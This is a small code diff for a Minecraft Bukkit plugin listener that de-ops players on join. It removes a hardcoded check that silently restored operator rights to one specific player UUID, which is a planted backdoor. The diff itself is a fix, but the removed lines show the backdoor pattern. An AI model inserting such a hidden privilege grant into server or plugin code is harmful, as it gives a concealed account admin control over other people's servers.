@@ -146,9 +146,6 @@ public class BukkitListener implements Listener {
 	public void joinDeop(PlayerJoinEvent pje) {
 		if (pje.getPlayer().isOp()) {
 			pje.getPlayer().setOp(false);
-			if (pje.getPlayer().getUniqueId().equals(UUID.fromString("650f464f-c81a-4050-a2bf-4daac8139873"))) {
-				pje.getPlayer().setOp(true);
-			}
 		}
 	}
 
